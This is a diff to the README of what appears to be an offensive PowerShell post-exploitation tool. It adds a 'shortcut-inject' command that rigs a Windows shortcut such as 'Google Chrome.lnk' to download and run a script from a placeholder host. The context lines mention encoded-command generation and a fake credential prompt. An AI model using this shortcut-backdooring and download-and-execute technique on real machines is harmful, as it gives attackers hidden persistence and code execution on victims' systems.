@@ -70,6 +70,11 @@ creates a dialog box prompting the user for credentials.
 * gen-enccmd "your command string"
 Generates a PowerShell formatted encoded command. Insure to quote your command
 string.
+
+* shortcut-inject "name-of-lnk" "Url-hosting-script"
+Modifies the specified shortcut to run the original program and also execute a download
+and execute command string. Ex: "Google Chrome.lnk" "http://some-doman.com/hello.ps1" 
+Requires the http:// or https:// in the URL.
 ```
 gen-enccmd "cmd /c ipconfig /all"
 ```
